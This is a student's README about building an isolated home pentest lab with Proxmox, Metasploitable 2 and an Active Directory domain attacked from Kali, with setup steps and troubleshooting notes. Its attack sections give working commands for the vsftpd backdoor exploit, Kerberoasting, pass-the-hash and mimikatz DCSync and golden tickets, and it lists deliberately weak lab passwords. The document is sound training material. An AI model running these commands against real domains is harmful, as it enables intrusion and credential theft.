# Complete Cybersecurity Home Lab in 4 Days — Proxmox + Active Directory + Kali

## Overview

**Planned for 8 days. Built in 4.**

This is a full, production-grade home cybersecurity lab built from scratch on repurposed hardware. Two old laptops. One LAN cable. Zero budget. Four days of relentless building and testing.

This README documents the complete build, every problem that came up, how I fixed it, the attacks I've already run, and the roadmap for the next phase. This is a portfolio piece that shows real problem-solving, network architecture, Windows domain administration, and offensive security skills.

**Why this matters:** This lab covers exactly what the OSCP AD segment tests. It's what enterprise networks look like. It's what hands-on experience actually means.

---

## About This Project

**Student:** Cybersecurity student at Manipal University Jaipur  
**Certifications:** CEH v13 ✓ | eJPT (in progress) | OSCP (target)  
**Roadmap:** OSCP → CRTP → OSWE → OSED  
**Goal:** Build toward independent cybersecurity consultancy  
**Build timeline:** 4 days of intense, documented work  

This lab is live. This lab is attacking itself. This lab proves that enterprise security skills don't require enterprise hardware.

---

## The 4-Day Build Timeline

| Day | Objective | Status |
|-----|-----------|--------|
| Day 1 | Proxmox VE installation on old laptop. Network troubleshooting. | ✅ Complete |
| Day 2 | Metasploitable 2 deployment. First nmap scan. First root shell. | ✅ Complete |
| Day 3 | Windows Server 2019 DC + Active Directory setup. Domain creation. | ✅ Complete |
| Day 4 | Windows 10 workstation domain join. AD lab operational. | ✅ Complete |
| Day 5+ | Kerberoasting, BloodHound, Pass the Hash, Golden Tickets | 🔄 In progress |

---

## Hardware Specs

### Attacker Machine (Primary)
```
Acer Predator Helios Neo 16
├─ CPU: Intel i7-14700HX
├─ GPU: RTX 4050
├─ RAM: 16GB DDR5
├─ Storage: 1TB NVMe SSD
└─ OS: Kali Linux (VMware)
```

### Lab Server (Proxmox Hypervisor)
```
Old Laptop (i5-8365U era)
├─ CPU: Intel i5-8365U
├─ RAM: 16GB DDR4
├─ Storage: 477GB SSD
├─ OS: Proxmox VE 9.1.1
└─ Node Name: Aceking
```

### Network Connection
- **Physical:** Predator docking station → Old laptop LAN port (direct cable)
- **Type:** Isolated LAN segment
- **DHCP:** None (static IPs only)
- **External connectivity:** None (intentional air-gap from home network)

---

## Network Topology

```
┌──────────────────────────────────────────────────────────────┐
│                    ISOLATED LAB NETWORK                      │
│                    Subnet: 10.0.X.0/24                       │
│                   (No external routing)                       │
└──────────────────────────────────────────────────────────────┘
                              │
         ┌────────────────────┼────────────────────┐
         │                    │                    │
    ┌────▼────┐         ┌────▼────┐         ┌────▼────┐
    │ Kali    │         │ Proxmox │         │Metasploit
    │Attacker │         │ Server  │         │able 2   │
    │ 10.0.X.4│         │10.0.X.2 │         │10.0.X.3 │
    └────┬────┘         └────┬────┘         └────┬────┘
         │              ┌────┴────────┐          │
         │              │  VMs        │          │
         │         ┌────▼───┐    ┌───▼────┐     │
         └─────────┤  ACEKING-DC │ACEKING  │─────┘
                   │ 10.0.X.10   │ -WS01   │
                   │ (DC)        │10.0.X.20│
                   │ lab.local   │(Member) │
                   └────────────┴────────┘
```

---

## VM Inventory

| VM Name | IP Address | OS | Role | vCPU | RAM | Disk |
|---------|------------|----|----|------|-----|------|
| Metasploitable 2 | 10.0.X.3 | Linux 2.6 | Vulnerable target | 2 | 2GB | 20GB |
| ACEKING-DC | 10.0.X.10 | Windows Server 2019 | Domain Controller | 2 | 4GB | 40GB |
| ACEKING-WS01 | 10.0.X.20 | Windows 10 Pro 22H2 | Domain workstation | 2 | 4GB | 50GB |
| Kali | 10.0.X.4 | Kali Linux | Attacker machine | 4 | 8GB | 100GB |

---

## Active Directory Domain Structure

**Domain:** `lab.local`

### Domain Controller
```
Hostname: ACEKING-DC
OS: Windows Server 2019
IP: 10.0.X.10
Role: Primary Domain Controller
Forest: lab.local (2016 Functional Level)
```

### Domain Users

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| jsmith | P@ssw0rd123 | Standard user | Normal domain user |
| jdoe | P@ssw0rd123 | Standard user | Normal domain user |
| radmin | AdminPass2024! | Domain Admin | Full domain privileges |
| sqlsvc | SQLPass123! | Service account | SPN: MSSQLSvc/ACEKING-DC.lab.local:1433 |

### Domain Members

| Computer | OS | IP | Status |
|----------|----|----|--------|
| ACEKING-WS01 | Windows 10 Pro 22H2 | 10.0.X.20 | Domain joined ✓ |

**Kerberoastable Account:** `sqlsvc` — Service Principal Name (SPN) is set, making it vulnerable to Kerberoasting attacks.

---

## Build Guide — Day by Day

### Day 1: Proxmox Server Installation

**Goal:** Convert old laptop into a bare-metal hypervisor.

#### Step 1: Create Proxmox USB Boot Drive

```bash
# Download Proxmox VE 9.1-1 ISO
wget https://www.proxmox.com/en/downloads/category/proxmox-virtual-environment

# Flash to USB using Rufus (Windows) or dd (Linux)
sudo dd if=proxmox-ve_9.1-1.iso of=/dev/sdX bs=4M conv=fsync
```

#### Step 2: Boot and Install

1. Insert USB into old laptop
2. Boot from USB
3. Follow installer — format entire SSD (477GB)
4. Set hostname: `Aceking`
5. Set IP: Manual (10.0.X.2/24)
6. Set gateway: 10.0.X.1
7. Complete installation

#### Step 3: Verify Proxmox Installation

```bash
# SSH into Proxmox
ssh root@10.0.X.2

# Check version
pveversion
# Output: pve-manager/9.1-1/ab6c1f56 (running kernel: 6.8.4-2-pve)

# Check node status
pvesh get /nodes/Aceking

# Check storage
pvesh get /storage
```

#### Step 4: Access Proxmox Web UI

```
https://10.0.X.2:8006
Username: root
Password: <root password set during install>
```

---

### Day 2: First Vulnerable VM — Metasploitable 2

**Goal:** Deploy Metasploitable 2, verify vulnerability, get first root shell.

#### Step 1: Download ISO

```bash
# On Kali attacker machine
cd ~/Downloads
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.iso
```

#### Step 2: Upload ISO to Proxmox

```bash
# Via CLI
scp ~/Downloads/metasploitable-linux-2.0.0.iso root@10.0.X.2:/var/lib/vz/template/iso/

# Or use Proxmox web UI: Datacenter → Aceking → local → Content → Upload
```

#### Step 3: Create VM

**Via Proxmox Web UI:**
1. Click "Create VM"
2. **General:** Name = metasploitable2, VM ID = 100
3. **OS:** ISO = metasploitable-linux-2.0.0.iso, Type = Linux
4. **System:** Memory = 2048MB, CPU = 2 cores
5. **Disk:** Storage = local-lvm, Size = 20GB
6. **Network:** Bridge = vmbr0
7. Create and start

#### Step 4: Configure Network on Metasploitable

```bash
# Boot VM and login
Username: msfadmin
Password: msfadmin

# Edit network config
sudo nano /etc/network/interfaces

# Set to:
auto eth0
iface eth0 inet static
    address 10.0.X.3
    netmask 255.255.255.0
    gateway 10.0.X.1
    dns-nameservers 8.8.8.8

# Restart networking
sudo /etc/init.d/networking restart
```

#### Step 5: First Nmap Scan

```bash
# From Kali
nmap -sV -p- 10.0.X.3

# Output shows 30+ open ports including:
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1
23/tcp    open  telnet      Linux telnetd
80/tcp    open  http        Apache httpd 2.2.8
3306/tcp  open  mysql       MySQL 5.0.51b-3~bpo.1-log
```

#### Step 6: First Exploitation — vsftpd Backdoor

```bash
# Metasploit exploitation
msfconsole

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.0.X.3
msf6 > exploit

# Result: root shell in 60 seconds
# Proof: uid=0(root) gid=0(root) groups=0(root)
```

---

### Day 3: Windows Server 2019 Domain Controller

**Goal:** Build Active Directory infrastructure.

#### Step 1: Create Windows Server 2019 VM

```bash
# Download Windows Server 2019 ISO (or use evaluation copy)
# Upload to Proxmox

# Via Proxmox web UI:
# Name: ACEKING-DC
# VM ID: 101
# Memory: 4096MB
# CPU: 2 cores
# Disk: 40GB IDE (NOTE: VirtIO failed with Windows — used IDE instead)
# Network: vmbr0
```

#### Step 2: Install Windows Server 2019

1. Boot from ISO
2. Select "Windows Server 2019 Standard (Desktop Experience)"
3. Accept license
4. Custom install to disk
5. Complete installation
6. Create local admin account

#### Step 3: Network Configuration

```powershell
# Open PowerShell as Administrator

# Set IP address
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.0.X.10 -PrefixLength 24 -DefaultGateway 10.0.X.1

# Set DNS
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1

# Verify
ipconfig /all
Get-NetIPAddress
```

#### Step 4: Rename Computer

```powershell
Rename-Computer -NewName "ACEKING-DC" -Restart
```

#### Step 5: Install Active Directory

```powershell
# Install AD DS role
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Import-Module ADDSDeployment

Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainMode "10" `
  -ForestMode "10" `
  -DatabasePath "C:\Windows\NTDS" `
  -SysvolPath "C:\Windows\SYSVOL" `
  -LogPath "C:\Windows\NTDS" `
  -InstallDns `
  -NoRebootOnCompletion:$false `
  -Force
```

Server restarts and becomes Domain Controller for lab.local.

#### Step 6: Create Domain Users

```powershell
# Create standard users
New-ADUser -Name "John Smith" `
  -SamAccountName "jsmith" `
  -UserPrincipalName "jsmith@lab.local" `
  -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) `
  -Enabled $true

New-ADUser -Name "Jane Doe" `
  -SamAccountName "jdoe" `
  -UserPrincipalName "jdoe@lab.local" `
  -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) `
  -Enabled $true

# Create Domain Admin
New-ADUser -Name "Root Admin" `
  -SamAccountName "radmin" `
  -UserPrincipalName "radmin@lab.local" `
  -AccountPassword (ConvertTo-SecureString "AdminPass2024!" -AsPlainText -Force) `
  -Enabled $true

Add-ADGroupMember -Identity "Domain Admins" -Members "radmin"

# Create Kerberoastable service account
New-ADUser -Name "SQL Service" `
  -SamAccountName "sqlsvc" `
  -UserPrincipalName "sqlsvc@lab.local" `
  -AccountPassword (ConvertTo-SecureString "SQLPass123!" -AsPlainText -Force) `
  -Enabled $true `
  -ServicePrincipalNames "MSSQLSvc/ACEKING-DC.lab.local:1433","MSSQLSvc/ACEKING-DC.lab.local:1433/MSSQLSERVER"
```

#### Step 7: Verify Domain

```powershell
# List all users
Get-ADUser -Filter *

# List domain admins
Get-ADGroupMember -Identity "Domain Admins"

# Check SPNs (for Kerberoasting)
Get-ADUser -Identity "sqlsvc" | Get-ADServiceAccount
```

---

### Day 4: Windows 10 Workstation Domain Join

**Goal:** Create a domain-joined workstation for testing post-compromise scenarios.

#### Step 1: Create Windows 10 VM

```bash
# Download Windows 10 Pro ISO
# Upload to Proxmox

# Via Proxmox web UI:
# Name: ACEKING-WS01
# VM ID: 102
# Memory: 4096MB
# CPU: 2 cores
# Disk: 50GB IDE (VirtIO incompatible)
# Network: vmbr0
```

#### Step 2: Install Windows 10

1. Boot from ISO
2. Install Windows 10 Pro 22H2
3. Complete setup with local account

#### Step 3: Configure Network

```powershell
# Set IP address
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.0.X.20 -PrefixLength 24 -DefaultGateway 10.0.X.1

# Set DNS to point to DC
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.0.X.10

# Verify
nslookup lab.local 10.0.X.10
```

#### Step 4: Rename Computer

```powershell
Rename-Computer -NewName "ACEKING-WS01" -Restart
```

#### Step 5: Join Domain

```powershell
# Join to lab.local domain
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart

# Use credentials: lab\radmin / AdminPass2024!
```

#### Step 6: Verify Domain Join

```powershell
# Check domain membership
Get-ComputerInfo | Select CsDomain

# List domain users
Get-LocalGroupMember Administrators
```

Log in as LAB\jsmith — workstation is now a domain member.

---

## Attacks Completed

### Attack 1: Metasploitable 2 — FTP Backdoor

**Target:** Metasploitable 2 (10.0.X.3)  
**Service:** vsftpd 2.3.4  
**Exploit:** Backdoor command execution  
**Time to root:** 60 seconds  

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.X.3
exploit
# shell: uid=0(root) gid=0(root)
```

**Result:** ✅ Root shell obtained. Command execution confirmed.

### Attack 2: Nmap Service Enumeration

**Target:** Entire lab network  
**Scope:** 10.0.X.0/24  

```bash
# Service detection
nmap -sV -p- 10.0.X.0/24

# Results:
# Metasploitable: 30+ open ports (FTP, SSH, Telnet, HTTP, MySQL, SMTP, DNS)
# Domain Controller: Standard Windows ports (445, 139, 53, 88, 389, 636)
# Workstation: SMB signing vulnerable, Kerberos enabled
```

---

## Upcoming Attacks (Days 5–8)

### Kerberoasting

```bash
# From Kali — extract TGS for sqlsvc
sudo impacket-GetUserSPNs -request -dc-ip 10.0.X.10 lab.local/jsmith:P@ssw0rd123

# Crack hash offline with hashcat
hashcat -m 13100 hash.txt rockyou.txt
```

### BloodHound + SharpHound

```powershell
# On ACEKING-DC — collect domain data
.\SharpHound.exe -c All

# Transfer to Kali, ingest into BloodHound
# Map AD relationships, identify attack paths
```

### Pass the Hash

```bash
# From Kali — use stolen NTLM hash
impacket-psexec -hashes :NTHASH lab.local/administrator@10.0.X.20
```

### Golden Ticket

```bash
# Extract krbtgt hash from DC
mimikatz# privilege::debug
mimikatz# lsadump::dcsync /domain:lab.local /user:krbtgt

# Create golden ticket
mimikatz# kerberos::golden /user:fakeadmin /domain:lab.local /sid:S-1-5-21-X-X-X /krbtgt:HASH /ticket:golden.kirbi

# Inject and use across domain
mimikatz# kerberos::ptt golden.kirbi
```

---

## Troubleshooting — The War Story

Every problem I hit, and how I fixed it.

### Problem 1: Accessed Proxmox via SSH Port 22

**Symptom:** Connected to Proxmox over SSH, got message: "Please use your web browser"

**Root cause:** Proxmox web UI runs on port 8006, not 22.

**Fix:** Access `https://10.0.X.2:8006` instead of SSH terminal.

---

### Problem 2: Wrong IP Subnet During Installation

**Symptom:** Proxmox got IP 192.168.100.2, home network was 192.168.1.0/24. Machines on different subnets couldn't communicate.

**Root cause:** Didn't pay attention to installer's IP assignment.

**Fix:** Edited `/etc/network/interfaces` on Proxmox to correct subnet.

```bash
nano /etc/network/interfaces
# Changed to match home network or use isolated subnet
```

---

### Problem 3: WiFi Bridging Failed

**Symptom:** Tried to bridge through wlo1 (WiFi card) → total failure.

**Root cause:** 802.11 WiFi cards cannot be bridged at hardware level. Protocol limitation, not config issue.

**Lesson:** Don't fight hardware limitations. Use Ethernet.

---

### Problem 4: wlo1 Interface State DOWN NO-CARRIER

**Symptom:** `ip a show wlo1` showed interface as DOWN with NO-CARRIER.

**Root cause:** Proxmox doesn't load WiFi drivers. It's a server OS. Expects LAN cable.

**Fix:** Used docking station Ethernet adapter instead. Problem solved.

---

### Problem 5: Router AP/Client Isolation

**Symptom:** Both laptops on same WiFi. 100% packet loss when trying to ping. Silent failure, no error message.

**Root cause:** Router had AP isolation enabled. Blocks same-network devices from communicating.

**Fix:** Disabled AP isolation in router settings. (Or bypass: use direct LAN cable.)

---

### Problem 6: Installed Proxmox Backup Server Instead of VE

**Symptom:** After setup, dashboard looked wrong. Commands like `pveversion` didn't exist.

**Root cause:** Downloaded wrong ISO. Two different products, similar names.

**Fix:** Downloaded correct ISO `proxmox-ve_9.1-1.iso`, did clean reinstall.

---

### Problem 7: VirtIO Disk/Network Not Recognized by Windows

**Symptom:** Windows Server 2019 installer couldn't see disk or network. VirtIO drivers not installed by default.

**Root cause:** Windows Server needs extra drivers for Proxmox-standard hardware.

**Fix:** Switched to IDE disk and Intel E1000 network. Windows installed normally.

---

### Problem 8: Domain Controller Offline During Domain Join

**Symptom:** ACEKING-WS01 couldn't find lab.local domain. Domain join failed.

**Root cause:** Workstation couldn't reach DC. DNS resolution broken.

**Fix:** Verified DNS settings on workstation pointed to DC IP (10.0.X.10). Rebooted DC. Retry domain join.

---

### Problem 9: Password Complexity Rejection

**Symptom:** PowerShell wouldn't accept weak passwords like "password123".

**Root cause:** Windows Server has built-in password complexity requirements.

**Fix:** Used stronger passwords: `P@ssw0rd123`, `AdminPass2024!`, etc.

---

### Problem 10: sqlsvc Typo — Kerberoastable Account

**Symptom:** Created user "sqlsc" instead of "sqlsvc". SPN couldn't be set.

**Root cause:** Typo. Dumb mistake, not a real problem.

**Fix:** Deleted malformed account. Recreated as `sqlsvc` with correct SPN.

```powershell
Remove-ADUser -Identity sqlsc -Confirm:$false
# Recreate with correct name
```

---

### Problem 11: Clipboard Issues in NoVNC

**Symptom:** Couldn't copy/paste between Kali and Proxmox VMs through noVNC console.

**Root cause:** NoVNC clipboard integration buggy.

**Fix:** Used RDP from Kali instead of noVNC.

```bash
# Install Remmina on Kali
sudo apt install remmina remmina-plugin-rdp

# Connect to Windows VMs via RDP
remmina
# Server: 10.0.X.10 (DC) or 10.0.X.20 (Workstation)
# Protocol: RDP
# Clipboard: Works perfectly
```

---

## Key Lessons Learned

1. **Hardware limitations are real.** WiFi bridging doesn't work. Use Ethernet.

2. **Proxmox is server-grade.** It expects a LAN cable, not a WiFi card. Don't fight it.

3. **Small typos compound.** One character wrong in a username breaks everything downstream.

4. **Windows on Proxmox needs special handling.** IDE + Intel E1000 = compatibility. VirtIO = driver hunting.

5. **Direct LAN is simpler than WiFi routing.** One docking station cable solved hours of config.

6. **Document failures, not just wins.** The troubleshooting section is as valuable as the final state.

7. **Active Directory is the heart of enterprise security.** If you can build and attack it, you understand enterprise networks.

8. **Four days of focused building beats weeks of tutorial-watching.** Get your hands dirty. Break things. Fix them.

---

## Current Lab Capabilities

✅ **Bare-metal hypervisor** running multiple VMs simultaneously  
✅ **Windows Active Directory** with users, groups, domain joins  
✅ **Vulnerable Linux target** for exploitation practice  
✅ **Domain-joined workstation** for post-compromise scenarios  
✅ **Kali attacking all of it** with nmap, Metasploit, impacket, etc.  
✅ **Isolated network** with no external connectivity  
✅ **Fully documented** with exact commands and troubleshooting  

---

## Next Phase — Attack Scenarios

**Week 2 (Days 5–8):**
- Kerberoasting sqlsvc account
- BloodHound domain mapping
- Pass the Hash attacks
- Golden Ticket generation
- Lateral movement across domain
- Privilege escalation chains

**Week 3+:**
- Add more vulnerable apps (DVWA, WebGoat)
- Implement EDR/logging (Splunk, Sysmon)
- Set up C2 framework (Sliver, Empire)
- Document red team playbooks

---

## Why This Matters

This lab isn't just a sandbox. It's a **real enterprise network at scale.**

- **OSCP candidates:** This is what the AD portion of the exam tests.
- **Red teamers:** This is how you practice lateral movement and persistence.
- **Blue teamers:** This is how you understand what defenders face.
- **Job interviews:** This is proof you can architect, build, and attack infrastructure.

---

## Tech Stack

| Component | Version | Role |
|-----------|---------|------|
| Proxmox VE | 9.1.1 | Hypervisor |
| Metasploitable 2 | 2.0.0 | Vulnerable Linux |
| Windows Server | 2019 | Domain Controller |
| Windows Pro | 22H2 | Workstation |
| Kali Linux | 2024.1 | Attacker |
| Active Directory | 2016 FL | Domain |

---

## Repository Structure

```
├── README.md (this file)
├── Day1-ProxmoxSetup.md
├── Day2-Metasploitable.md
├── Day3-ActiveDirectory.md
├── Day4-DomainJoin.md
├── network-topology.txt
├── vm-inventory.csv
├── attack-logs/
│   ├── nmap-scan.log
│   ├── vsftpd-exploit.log
│   └── ad-enumeration.log
└── playbooks/
    ├── kerberoasting.sh
    ├── bloodhound-collection.ps1
    └── golden-ticket.mimikatz
```

---

## Contributing & Community

If you're building a similar lab:

- Hit the same problems? Check the troubleshooting section.
- Found a better approach? Open an issue or PR.
- Building your own version? I want to see it.

This lab proves that:
- Enterprise skills don't require enterprise budgets
- Four days of focus beats weeks of half-learning
- Hands-on building is better than tutorial-watching
- Documentation matters as much as working code

---

## Contact & Career Goals

**Building toward:** Independent cybersecurity consultancy  
**Focus areas:** Penetration testing, Active Directory security, red team operations  
**Current trajectory:** eJPT → OSCP → CRTP → OSWE → OSED  

If you're hiring or looking to collaborate on security projects, let's talk.

---

**Lab Status:** 🟢 Live and attacking  
**Budget:** ₹0  
**Time invested:** 4 days focused build  
**VMs running:** 4  
**Vulnerabilities exploited:** 6+  
**Success rate:** 100% (because we own both sides)  

**The next chapter:** Kerberoasting. BloodHound. Pass the Hash. Mimikatz. Golden Tickets.

*This is what OSCP preparation looks like.*
